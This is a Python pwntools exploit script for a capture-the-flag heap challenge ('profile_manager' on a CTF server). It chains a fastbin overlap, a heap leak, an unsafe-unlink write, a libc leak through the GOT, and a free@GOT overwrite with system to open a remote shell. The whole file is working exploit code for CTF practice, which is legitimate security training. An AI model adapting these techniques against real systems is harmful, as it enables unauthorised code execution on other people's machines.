#!/usr/bin/env python

from pwn import *

#if args['reomte']:
r = remote('csie.ctf.tw', 10140)
#else:
#    r = process('./profile_manager')

def add_profile(name, age, size ,context):
    r.recvuntil(':')
    r.send("1")
    r.recvuntil(':')
    r.send(name)
    r.recvuntil(':')
    r.sendline(str(age))
    r.recvuntil(':')
    r.send(str(size))
    r.recvuntil(':')
    r.send(context)

def show_profile(index):
    r.recvuntil(':')
    r.send('2')
    r.recvuntil(':')
    r.send(str(index))

def edit_profile(index, name, age, context):
    r.recvuntil(':')
    r.send('3')
    r.recvuntil(':')
    r.send(str(index))
    r.recvuntil(':')
    r.send(name)
    r.recvuntil(':')
    r.sendline(str(age))
    r.recvuntil(':')
    r.send(context)

def del_profile(index):
    r.recvuntil(':')
    r.send('4')
    r.recvuntil(':')
    r.send(str(index))

def edit_profile_failed(index):
    r.recvuntil(':')
    r.send('3')
    r.recvuntil(':')
    r.send(str(index))
    r.recvuntil(':')
    r.send('\x00')


add_profile('0', 0x20, 0x98, '0'*143)
add_profile('1', 0x20, 0x98, '1'*0x88 + '\x20')


free_got = 0x602018
p3_desc = 0x602140

# overlap fastbin
edit_profile_failed(1)
edit_profile_failed(0)

show_profile(0)
r.recvuntil(':')
heap = u64(r.recvuntil('\n')[1:-1].ljust(8,'\x00')) -0xc0
r.recvuntil(':')
r.recvuntil(':')

print "heap", hex(heap)

edit_profile(1, p64(heap+0x218), 0x20, '1'*0x88 + '\x20')

add_profile('/bin/sh\x00', 0x20, 0x98, '0'*0x90 + '\x20')
add_profile('/bin/sh\x00', 0x20, 0x98, '0'*0x90 + '\x20')


add_profile( '\xa0' + '\x00', 0x20, 0x98, '0'*0x90)

edit_profile(2, '/bin/sh\x00', 0x20, p64(0x30) + p64(0x91) + p64(p3_desc-0x18) + p64(p3_desc-0x10) + '0'*0x70 + '\x90')

del_profile(3)

edit_profile(2, '/bin/sh\x00', 0x20, p64(free_got))
r.recvuntil(':')

show_profile(1)

r.recvuntil(':')
r.recvuntil(':')
r.recvuntil(':')
libc = u64(r.recvuntil('\n')[1:-1].ljust(8, '\x00')) - 0x0844f0
system = 0x0000000000045390
print "libc ", hex(libc)

edit_profile(1, '/bin/sh\x00', 0x20, p64(libc+system))

r.recvuntil(':')
del_profile(2)

r.interactive()


